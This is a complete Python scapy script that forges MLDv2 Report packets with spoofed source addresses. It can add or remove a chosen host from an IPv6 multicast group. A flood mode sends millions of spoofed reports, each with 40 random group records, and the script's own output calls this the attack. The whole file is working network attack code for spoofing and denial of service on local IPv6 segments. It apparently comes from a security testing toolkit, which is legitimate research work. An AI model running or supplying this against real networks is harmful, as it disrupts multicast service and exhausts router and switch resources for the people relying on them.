#!/usr/bin/python3
import argparse
import random
import sys
import netifaces
import netifaces as ni
from scapy.arch import get_if_hwaddr
from scapy.layers.inet6 import IPv6, IPv6ExtHdrHopByHop, RouterAlert, ICMPv6MLQuery2, ICMPv6MLDMultAddrRec, \
    ICMPv6MLReport2
from scapy.layers.l2 import Ether
from scapy.sendrecv import sendp, sendpfast
from validate_parameters import is_valid_ipv6
from validate_parameters import is_valid_mac
from validate_parameters import mac2ipv6


def main():
    parser = argparse.ArgumentParser(description="Sending MLDv2 Report message to a target for adding or removing a "
                                                 "specified host from a specified multicast group, with option to "
                                                 "flood.")
    parser.add_argument("interface", nargs="?", help="the network interface to use from the sender")
    parser.add_argument("-smac", dest="source_mac", action="store",
                        help="the MAC address of sender (resolved from the interface if skipping)")
    parser.add_argument("-sip", dest="source_ip", action="store", help="the IPv6 address of sender (resolved from the"
                                                                       " interface if skipping)")
    parser.add_argument("-dip", dest="destination_ip", action="store", help="the IPv6 address of destination (ff02::16"
                                                                            " if skipping)")
    parser.add_argument('-c', dest='choice', choices=['add', 'remove'], action="store", default='add',
                        help="choose one of two options: add, remove")
    parser.add_argument("-mip", dest="multicast_ip", action="store", help="the multicast address representing the "
                                                                          "group (set to :: if skipping)")
    parser.add_argument("-tip", dest="target_ip", action="store", help="the target to add or remove from group (set to "
                                                                       "random address if skipping)")
    parser.add_argument("-f", dest="flood", action="store_true", help="flood the target with falsified "
                                                                      "MLDv2 Report messages")
    args = parser.parse_args()

    # Validate the input
    if len(sys.argv) <= 1:
        parser.print_help()
        sys.exit(1)

    # Validate the network interface
    if not args.interface:
        print("---> Network interface is required!!!")
        parser.print_help()
        sys.exit(1)
    interface_list = netifaces.interfaces()
    while True:
        if args.interface in interface_list:
            break
        else:
            print("---> The given interface is invalid. Try again!!!")
            sys.exit(1)

    # Validate the source IPv6 address
    if args.source_ip is None:
        length = len(ni.ifaddresses(args.interface)[ni.AF_INET6])
        args.source_ip = ni.ifaddresses(args.interface)[ni.AF_INET6][length - 1]['addr']
        args.source_ip = args.source_ip.replace("%", '')
        args.source_ip = args.source_ip.replace(args.interface, '')
    if args.source_ip is not None:
        if not is_valid_ipv6(args.source_ip):
            print("---> The given source IPv6 address is invalid. Try again!!!")
            sys.exit(1)

    # Validate the destination IPv6 address
    if args.destination_ip is None:
        args.destination_ip = "ff02::16"
    if args.destination_ip is not None:
        if not is_valid_ipv6(args.destination_ip):
            print("---> The given destination IPv6 address is invalid. Try again!!!")
            sys.exit(1)

    # Validate the source MAC address
    if args.source_mac is None:
        args.source_mac = get_if_hwaddr(args.interface)
    if args.source_mac is not None:
        if not is_valid_mac(args.source_mac):
            print("---> The given source MAC address is invalid. Try again!!!")
            sys.exit(1)

    # Validate the choice
    if args.choice is None:
        args.choice = "add"
    if args.choice == "add":
        choice = 3  # CHANGE_TO_INCLUDE
    if args.choice == "remove":
        choice = 4  # CHANGE_TO_EXCLUDE

    # Validate the multicast IPv6 address
    if args.multicast_ip is None:
        args.multicast_ip = "::"
    if args.multicast_ip is not None:
        if not is_valid_ipv6(args.multicast_ip):
            print("---> The given multicast address is invalid. Try again!!!")
            sys.exit(1)

    # Validate the target IPv6 address
    if args.target_ip is None:
        M = 16 ** 4
        args.target_ip = "fe80::dead:" + ":".join(("%x" % random.randint(0, M)
                                                   for j in range(4)))
    if args.source_ip is not None:
        if not is_valid_ipv6(args.target_ip):
            print("---> The given target IPv6 address is invalid. Try again!!!")
            sys.exit(1)

    # Generate packet
    layer3 = IPv6(src=args.source_ip, dst=args.destination_ip, hlim=1)
    HBH = IPv6ExtHdrHopByHop(options=RouterAlert(otype=5, optlen=2, value=0))
    source_list = [args.target_ip]
    MAR = ICMPv6MLDMultAddrRec(rtype=choice, dst=args.multicast_ip, sources=source_list)
    MLD = ICMPv6MLReport2(type=143, records_number=1, records=MAR)
    if not args.flood:
        packet1 = Ether(src=args.source_mac) / layer3 / HBH / MLD
        if choice == 3:
            print("Adding the target: " + args.target_ip + " to the multicast group: " + args.multicast_ip)
        if choice == 4:
            print("Removing the target: " + args.target_ip + " from the multicast group: " + args.multicast_ip)
        sendp([packet1, packet1], verbose=False, iface=args.interface)
    if args.flood:
        pkt_list = []
        print("Flooding the destination: " + args.destination_ip + " with MLDv2 Report messages (press Ctrl+C to "
                                                                   "stop the attack).....")
        for i in range(5000):
            smac = ':'.join('%02x' % random.randint(0, 255) for x in range(6))
            sip = mac2ipv6(smac)
            layer3 = IPv6(src=sip, dst=args.destination_ip, hlim=1)
            HBH = IPv6ExtHdrHopByHop(options=RouterAlert(otype=5, optlen=2, value=0))
            num_records = 40
            mar_list = []
            for j in range(num_records):
                random.seed()
                mulip = "ff0d::dead:%x:%x" % (random.getrandbits(16), random.getrandbits(16))
                source = sip
                MAR = ICMPv6MLDMultAddrRec(rtype=3, dst=mulip, sources=[source])
                mar_list.append(MAR)
            MLD = ICMPv6MLReport2(type=143, records_number=num_records, records=mar_list)
            packet1 = Ether(src=smac, dst="33:33:00:00:00:16") / layer3 / HBH / MLD
            pkt_list.append(packet1)
        try:
            sendpfast(pkt_list, mbps=60000, loop=5000000, iface=args.interface)
        except KeyboardInterrupt:
            sys.exit(0)


if __name__ == "__main__":
    main()
